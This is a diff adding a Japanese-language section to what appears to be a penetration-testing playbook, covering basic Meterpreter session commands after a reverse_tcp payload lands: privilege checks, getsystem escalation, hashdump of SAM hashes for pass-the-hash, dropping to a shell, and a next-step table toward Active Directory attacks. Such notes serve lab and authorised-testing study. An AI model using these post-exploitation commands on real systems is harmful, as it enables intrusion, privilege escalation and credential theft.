@@ -121,6 +121,44 @@ msf > set LHOST [IF_NAME]             # または IF 名で渡す（IP が変わ
 
 ---
 
+## 5. Meterpreter セッション基礎
+
+**着火条件:** 既定ペイロード（`windows/meterpreter/reverse_tcp` 等）でセッションが開いた直後。プロンプトが `meterpreter >` になっている。
+
+> **meterpreter は OS のシェルそのものではない。** `id` / `whoami` / `ls` などの OS コマンドをそのまま打っても `Unknown command: id` のように弾かれる。meterpreter 専用コマンドで操作するか、`shell` で OS シェルに落ちてから OS コマンドを打つ。
+
+**コマンド:**
+
+```bash
+meterpreter > getuid          # 現在の権限（例: NT AUTHORITY\SYSTEM）。OS の whoami の代わり
+meterpreter > sysinfo         # OS / ビルド / アーキ / ドメイン参加の有無
+meterpreter > getsystem       # まだ SYSTEM でなければ権限昇格を試行
+meterpreter > hashdump        # SAM ハッシュ（要 SYSTEM）→ PtH / クラックへ
+meterpreter > shell           # OS のコマンドシェルに落ちる（cmd.exe / /bin/sh）
+meterpreter > background      # セッションを保持したまま msf プロンプトへ戻る
+msf > sessions -i [SESSION_ID]  # background したセッションに再アタッチ
+```
+
+**観測される出力 → 次のアクション:**
+
+| 出力 | 示唆 | 次のアクション |
+|---|---|---|
+| `getuid` が `NT AUTHORITY\SYSTEM` | ローカル最高権限を取得済み | 侵入後列挙へ（`../04_Post_Access_Windows_AD/Enumeration_Checklist.md`）・`hashdump` で横展開の起点に |
+| `getuid` が一般ユーザー | 権限昇格が必要 | `getsystem` → 失敗なら侵入後の権限昇格列挙へ |
+| `sysinfo` の `Domain:` がワークグループ名 | スタンドアロン（非 AD） | ローカル資産の探索に集中 |
+| `sysinfo` の `Domain:` が AD ドメイン名 | ドメイン参加ホスト | AD フロー（`../00_Playbook/Windows_AD_Attack_Flow.md`）へ合流 |
+
+**注意（古い Windows の罠）:** `shell` で OS シェルに落ちた後に `whoami` で権限確認しようとすると、**Windows XP / 2000 では `'whoami' is not recognized` になる**（`whoami.exe` は Windows Server 2003 / Vista 以降で標準同梱。XP / 2000 には既定で入っていない）。古い Windows での権限確認の代替手段:
+
+```cmd
+echo %USERNAME%      :: SYSTEM 権限ではマシンアカウント名 [HOSTNAME]$ が返る（＝SYSTEM 取得の傍証）
+net user             :: ローカルアカウント一覧
+```
+
+最も確実なのは `shell` を抜けて（`exit`）meterpreter 側に戻り `getuid` を使うこと。meterpreter は対象 OS の `whoami` の有無に依存せず権限を返す。
+
+---
+
 ## 刺さらなかったとき（全体）
 
 | 状況 | 推定原因 | 代替手段 |
